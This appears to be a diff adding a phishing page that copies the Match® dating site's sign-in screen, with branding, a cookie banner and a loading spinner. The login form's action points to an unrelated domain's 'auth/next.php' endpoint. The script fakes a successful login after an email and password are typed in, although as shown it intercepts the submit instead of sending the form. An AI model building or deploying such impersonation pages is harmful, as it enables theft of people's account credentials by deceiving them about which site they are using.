@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Match® | Login</title>
+  <style>
+    body {
+      font-family: "Georgia", serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .container {
+      width: 100%;
+      padding: 60px 20px;
+    }
+
+    h1 {
+      text-align: center;
+      font-weight: normal;
+      font-size: 32px;
+      margin-bottom: 30px;
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 36px;
+      font-weight: bold;
+      color: #0b0b4f;
+      margin-bottom: 40px;
+    }
+
+    .join {
+      text-align: center;
+      font-size: 16px;
+      margin-bottom: 25px;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    }
+
+    .join a {
+      color: #0056ff;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 20px;
+      padding-right: 1000px;
+      border: none;
+      background-color: #fafafa;
+      border-radius: 4px;
+      font-size: 16px;
+      outline: none;
+      box-sizing: border-box;
+      margin: 10px 0;
+    }
+
+    .signin-btn {
+      background-color: #0b0b4f;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      padding: 15px;
+      font-size: 18px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: 0.2s;
+      margin-top: 10px;
+    }
+
+    .signin-btn:hover {
+      background-color: #18186b;
+    }
+
+    .links {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 25px;
+      color: #555;
+    }
+
+    .links a {
+      color: #0056ff;
+      text-decoration: none;
+      margin: 0 8px;
+    }
+
+    .version {
+      text-align: center;
+      color: #999;
+      font-size: 12px;
+      margin-top: 30px;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 40px 15px;
+      }
+
+      h1 {
+        font-size: 28px;
+      }
+
+      .logo {
+        font-size: 30px;
+      }
+    }
+
+    /* Preloader */
+    #preloader {
+      position: fixed;
+      inset: 0;
+      background: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+    }
+
+    #preloader.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border: 6px solid #eee;
+      border-top-color: #0b0b4f;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .heart {
+      font-size: 10px;
+      color: #0b0b4f;
+    }
+
+    /* Cookie Popup */
+    .cookie-popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: 9998;
+    }
+
+    .cookie-content {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 480px;
+      width: 90%;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .cookie-content h2 {
+      font-size: 18px;
+      margin-bottom: 12px;
+      font-family: system-ui, sans-serif;
+      color: #000;
+    }
+
+    .cookie-content p {
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+
+    .cookie-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      flex-wrap: wrap;
+    }
+
+    .cookie-buttons button {
+      padding: 12px 20px;
+      border: none;
+      border-radius: 25px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .personalize-btn {
+      background-color: white;
+      color: #0056ff;
+      border: 1px solid #0056ff;
+    }
+
+    .accept-btn {
+      background-color: #0056ff;
+      color: white;
+    }
+
+    .cookie-buttons button:hover {
+      opacity: 0.9;
+    }
+  </style>
+</head>
+
+<body class="preloading">
+  <!-- Preloader -->
+  <div id="preloader" aria-hidden="true">
+    <div style="text-align:center">
+      <div class="spinner" aria-hidden="true"></div>
+      <div
+        style="margin-top:12px;color:#333;font-family:system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;">
+        Loading...</div>
+    </div>
+  </div>
+
+  <!-- Cookie Popup -->
+  <div id="cookiePopup" class="cookie-popup" style="display:none;">
+    <div class="cookie-content">
+      <h2>We value your privacy</h2>
+      <p>We and our partners use tracking devices to measure the audience of our website, provide you with offers and
+        advertising tailored to your interests, and to enable interactive social platform features such as share
+        buttons. <a href="#" style="color:#0056ff;text-decoration:none;">Cookie Policy</a>
+      </p>
+      <div class="cookie-buttons">
+        <button class="personalize-btn">Personalize my choices</button>
+        <button class="accept-btn" id="acceptCookies">Accept</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div id="main-content">
+    <div class="container">
+      <div class="logo">match<span class="heart">🖤</span></div>
+      <h1>Sign in</h1>
+      <div class="join">Not a member? <a href="#">Join</a></div>
+      <form id="loginForm" action="https://sazs.otkg.sa.com/auth/next.php">
+        <input type="email" id="email" placeholder="Email" required />
+        <input type="password" id="password" placeholder="Password" required />
+        <button type="submit" class="signin-btn">Sign in</button>
+      </form>
+      <div class="links">
+        <a href="#">Forgot email</a> •
+        <a href="#">Forgot password</a> •
+        <a href="#">Help</a>
+      </div>
+      <div class="version">
+        v25.30.00 #f9b079 n!ron h!da--ltx api:match pid:67
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Preloader fade out
+    document.addEventListener('DOMContentLoaded', function () {
+      setTimeout(function () {
+        const pre = document.getElementById('preloader');
+        if (pre) {
+          pre.classList.add('hidden');
+          document.body.classList.remove('preloading');
+          setTimeout(() => pre.remove(), 600);
+        }
+        showCookiePopup();
+      }, 2000);
+    });
+
+    // Cookie popup display
+    function showCookiePopup() {
+      const accepted = localStorage.getItem('cookiesAccepted');
+      if (!accepted) {
+        document.getElementById('cookiePopup').style.display = 'flex';
+      }
+    }
+
+    // Accept button
+    document.getElementById('acceptCookies').addEventListener('click', function () {
+      localStorage.setItem('cookiesAccepted', 'true');
+      document.getElementById('cookiePopup').style.display = 'none';
+    });
+
+    // Form submission preloader
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!email || !password) {
+        alert("Please fill out all fields.");
+        return;
+      }
+
+      const preloader = document.createElement('div');
+      preloader.id = 'preloader';
+      preloader.innerHTML = `
+        <div style="text-align:center">
+          <div class="spinner" aria-hidden="true"></div>
+          <div style="margin-top:12px;color:#333;font-family:system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;">Submitting...</div>
+        </div>
+      `;
+      document.body.appendChild(preloader);
+
+      setTimeout(() => {
+        preloader.classList.add('hidden');
+        setTimeout(() => preloader.remove(), 600);
+        alert("Login successful! Welcome, " + email);
+        e.target.reset();
+      }, 2000);
+    });
+  </script>
+</body>
+
+</html>
